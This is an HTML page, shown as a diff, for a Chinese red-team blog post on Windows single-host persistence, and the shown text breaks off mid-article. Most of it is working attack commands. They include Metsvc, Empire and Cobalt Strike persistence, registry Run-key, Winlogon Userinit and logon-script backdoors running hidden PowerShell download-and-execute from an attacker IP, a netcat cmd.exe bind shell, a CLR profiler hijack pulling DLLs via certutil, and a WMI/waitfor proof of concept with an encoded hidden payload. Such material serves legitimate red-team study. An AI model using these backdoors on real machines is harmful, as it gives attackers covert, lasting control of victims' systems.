@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="如果我有的选，我能比你们所有人都好。——《何以为家》  windows单机Persistence">
+<meta name="keywords" content="Persistence">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows单机Persistence">
+<meta property="og:url" content="https://lengjibo.github.io/Persistence/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="如果我有的选，我能比你们所有人都好。——《何以为家》  windows单机Persistence">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/16.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/17.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/18.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/19.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/20.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/21.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/22.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/23.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/24.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/25.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/26.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/27.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/28.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/29.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/30.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/31.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/32.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/Persistence/33.png">
+<meta property="og:updated_time" content="2020-05-24T08:40:53.028Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows单机Persistence">
+<meta name="twitter:description" content="如果我有的选，我能比你们所有人都好。——《何以为家》  windows单机Persistence">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/Persistence/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/Persistence/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>windows单机Persistence | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/Persistence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">windows单机Persistence
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-05-24 16:33:43 / Updated at: 16:40:53" itemprop="dateCreated datePublished" datetime="2020-05-24T16:33:43+08:00">2020-05-24</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>如果我有的选，我能比你们所有人都好。——《何以为家》</p>
+<hr>
+<p>windows单机Persistence</p>
+<a id="more"></a>
+<p>聊一聊windows下的Persistence。</p>
+<h2 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h2><p>我们先来看一下三大渗透框架中对于权限维持的解决方案。</p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><h3 id="Persistence模块"><a href="#Persistence模块" class="headerlink" title="Persistence模块"></a>Persistence模块</h3><p>通过启动项启动(persistence)的方式，在目标机器上以反弹回连。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i 10 -p 4444 -r 192.168.1.68</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/0.png" alt="0.png"></p>
+<p>-U：设置后门在用户登录后自启动。该方式会在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+<p>下添加注册表信息</p>
+<p>-X：设置后门在系统启动后自启动。该方式会在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+<p>下添加注册表信息。</p>
+<p>-S：作为服务自动启动代理程序。</p>
+<h3 id="Metsvc-模块"><a href="#Metsvc-模块" class="headerlink" title="Metsvc 模块"></a>Metsvc 模块</h3><p>通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务</p>
+<p><img src="../images/Persistence/1.png" alt="1.png"></p>
+<p>目标机器的会开启一个服务。</p>
+<p><img src="../images/Persistence/2.png" alt="2.png"></p>
+<h3 id="Scheduleme-amp-Schtasksabus"><a href="#Scheduleme-amp-Schtasksabus" class="headerlink" title="Scheduleme &amp; Schtasksabus"></a>Scheduleme &amp; Schtasksabus</h3><p>msf中自动利用计划任务的后门程序。</p>
+<p><img src="../images/Persistence/3.png" alt="3.png"></p>
+<p>demo：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot;</span><br></pre></td></tr></table></figure>
+<p>上传nc并创建计划任务每一分钟执行一次 ‘nc -e cmd.exe -L -p 8080’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run schtasksabuse -t 192.168.1.68 -c &quot;cmd /c calc.exe&quot; -d 4</span><br></pre></td></tr></table></figure>
+<p>每隔4秒执行一次calc.exe </p>
+<h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h2><p>empire下提供了很多的权限维持的模块：</p>
+<p><img src="../images/Persistence/4.png" alt="4.png"></p>
+<p>分类</p>
+<p><img src="../images/Persistence/5.png" alt="5.png"></p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(Empire: 4CH7TZAE) &gt; usemodule persistence/elevated/schtasks*</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; set Listener http1</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; set DailyTime 21:35</span><br><span class="line">(Empire: powershell/persistence/elevated/schtasks) &gt; execute</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/6.png" alt="6.png"></p>
+<p>update下可以看到powershell的启动</p>
+<p><img src="../images/Persistence/7.png" alt="7.png"></p>
+<h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><h3 id="注册表："><a href="#注册表：" class="headerlink" title="注册表："></a>注册表：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;keyname&quot; /t REG_SZ /d &quot;C:\Users\administrator\Desktop\1.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<p>重启获得shell。</p>
+<p><img src="../images/Persistence/8.png" alt="8.png"></p>
+<h2 id="技术篇"><a href="#技术篇" class="headerlink" title="技术篇"></a>技术篇</h2><p>对常见的权限维持的技术原理、实现方法、检测技巧进行总结、复现。</p>
+<h2 id="注册表类："><a href="#注册表类：" class="headerlink" title="注册表类："></a>注册表类：</h2><h3 id="普通注册表后门"><a href="#普通注册表后门" class="headerlink" title="普通注册表后门"></a>普通注册表后门</h3><p>在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU\Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行</p>
+<p>cmd下操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;C:\Users\administrator\desktop\pentestlab.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>powershell下操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\&quot; &quot;Pentestlab&quot; &quot;C:\Users\administrator\desktop\pentestlab.exe&quot; -Force</span><br></pre></td></tr></table></figure>
+<p>电脑重启后上线：</p>
+<p><img src="../images/Persistence/9.png" alt="9.png"></p>
+<p>除了上面的位置之外还有下面的位置，可以让我们实现权限维持：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure>
+<p>上面的是针对于用户的注册表，下面的这几个是针对本地计算机的注册表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure>
+<p>添加载荷的方法的自然也和之前的一样了，只是所处的位置不同罢了，注意service的程序。而防御与检测策略也是比较好做的，在这些的注册表的位置查看是否有可疑程序即可。</p>
+<h3 id="Winlogon-Helper-DLL后门"><a href="#Winlogon-Helper-DLL后门" class="headerlink" title="Winlogon Helper DLL后门"></a>Winlogon Helper DLL后门</h3><p>Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程。所以我们可以依靠这个注册表来进行权限维持。</p>
+<p>注册表位置如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</span><br></pre></td></tr></table></figure>
+<p>其中的userinit与shell主要是来运行exe程序，而notify则用来执行dll文件（Windows 7之前）。</p>
+<p>而userinit又可以通过powershell的方式，来实现无文件后门，用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit</span><br><span class="line"> -value &quot;C:\Windows\system32\userinit.exe,powershell.exe -nop -w hidden -c `&quot;IEX ((new-object net.webclient).downloadstr</span><br><span class="line">ing(`&apos;http://192.168.31.109:8080/a`&apos;))`&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/10.png" alt="10.png"></p>
+<p>注意代码引号的转义问题。可以使用反引号绕过。</p>
+<h3 id="Logon-Scripts后门"><a href="#Logon-Scripts后门" class="headerlink" title="Logon Scripts后门"></a>Logon Scripts后门</h3><p>注册表路径: HKCU\Environment\<br>创建字符串键值: UserInitMprLogonScript</p>
+<p>cmd下操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU:\Environment\&quot; /v UserInitMprLogonScript /t REG_SZ /d &quot;C:\1.bat&quot;</span><br></pre></td></tr></table></figure>
+<p>powershell下操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty &quot;HKCU:\Environment\&quot; &quot;UserInitMprLogonScript&quot; &quot;C:\1.bat&quot; -Force</span><br></pre></td></tr></table></figure>
+<p>bat内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.31.109:8080/a&apos;))&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/11.png" alt="11.png"></p>
+<p>Logon Scripts是优先于很多杀毒软件启动（部分杀毒是优先于他启动）的，所以可以通过这种方式将powershell命令写到bat脚本中，达到免杀隐藏启动的效果。<br>缺点就是需要留文件，并不方便。</p>
+<h3 id="注册表之CLR"><a href="#注册表之CLR" class="headerlink" title="注册表之CLR"></a>注册表之CLR</h3><p>CLR全称为Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。<br>要使clr能够劫持系统中全部.net程序，需要设置环境变量，要是只用命令行，可以使用wmi。</p>
+<p>直接给出批处理文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;</span><br><span class="line">wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;</span><br><span class="line">certutil.exe -urlcache -split -f yourdll</span><br><span class="line">certutil.exe -urlcache -split -f yourdll delete</span><br><span class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F</span><br><span class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure>
+<p>x64：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;</span><br><span class="line">wmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;</span><br><span class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</span><br><span class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete</span><br><span class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll</span><br><span class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete</span><br><span class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg_x64.dll&quot; /F</span><br><span class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F </span><br><span class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\msg.dll&quot; /F</span><br><span class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure>
+<p><img src="../images/Persistence/12.png" alt="12.png"></p>
+<h2 id="内部工具类"><a href="#内部工具类" class="headerlink" title="内部工具类"></a>内部工具类</h2><h3 id="waitfor-exe"><a href="#waitfor-exe" class="headerlink" title="waitfor.exe"></a>waitfor.exe</h3><p>该工具用来同步网络中计算机，可以发送或等待系统上的信号。</p>
+<p>支持下列操作系统：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003</span><br><span class="line">Windows Vista</span><br><span class="line">Windows XP</span><br><span class="line">Windows Server 2008</span><br><span class="line">Windows 7</span><br><span class="line">Windows Server 2003 with SP2</span><br><span class="line">Windows Server 2003 R2</span><br><span class="line">Windows Server 2008 R2</span><br><span class="line">Windows Server 2000</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2003 with SP1</span><br><span class="line">Windows 8</span><br><span class="line">Windows 10</span><br></pre></td></tr></table></figure>
+<p>首先新建一个powershell文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start-process calc.exe</span><br><span class="line">cmd /c waitfor persist `&amp;`&amp; powershell -executionpolicy bypass -file c:\test\1.ps1</span><br></pre></td></tr></table></figure>
+<p>然后开启等待：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waitfor persist1 &amp;&amp; powershell -executionpolicy bypass -file c:\test\1.ps1</span><br></pre></td></tr></table></figure>
+<p>另一个cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waitfor /s 127.0.0.1 /si persist1</span><br></pre></td></tr></table></figure>
+<p>即可成功调用cmd。</p>
+<p>注意，低版本powershell会报错：</p>
+<p><img src="../images/Persistence/13.png" alt="13.png"></p>
+<p>或者使用三好学生师傅的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;#</span><br><span class="line">	A quick POC to use Waitfor.exe to maintain persistence</span><br><span class="line">	Author: 3gstudent @3gstudent</span><br><span class="line">	Learn from:https://twitter.com/danielhbohannon/status/872258924078092288</span><br><span class="line">#&gt;</span><br><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_Backdoor&apos;</span><br><span class="line">$StaticClass.Put()| Out-Null</span><br><span class="line">$StaticClass.Properties.Add(&apos;Code&apos; , &quot;cmd /c start calc.exe ```&amp;```&amp; taskkill /f /im powershell.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==&quot;)</span><br><span class="line">$StaticClass.Put() | Out-Null</span><br><span class="line"></span><br><span class="line">$exec=([WmiClass] &apos;Win32_Backdoor&apos;).Properties[&apos;Code&apos;].Value;</span><br><span class="line">iex $exec | Out-Null</span><br></pre></td></tr></table></figure>
+<p>然后使用下面的方式开启：</p>
